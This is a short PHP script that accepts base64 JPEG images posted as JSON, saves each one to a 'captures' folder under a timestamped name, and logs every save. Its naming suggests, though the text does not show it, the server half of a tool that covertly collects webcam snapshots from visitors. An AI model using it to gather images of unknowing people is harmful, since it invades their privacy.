<?php
$folder = 'captures';
if (!file_exists($folder)) {
    mkdir($folder, 0755, true);
}

$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['image'])) {
    $img = str_replace('data:image/jpeg;base64,', '', $data['image']);
    $img = str_replace(' ', '+', $img);
    $imgData = base64_decode($img);
    $filename = $folder . '/capture_' . date('Ymd_His') . '_' . uniqid() . '.jpg';
    file_put_contents($filename, $imgData);

    $log = "[" . date("Y-m-d H:i:s") . "] Saved: $filename\n";
    file_put_contents("image.log", $log, FILE_APPEND);
    file_put_contents("combined.log", $log, FILE_APPEND);
}
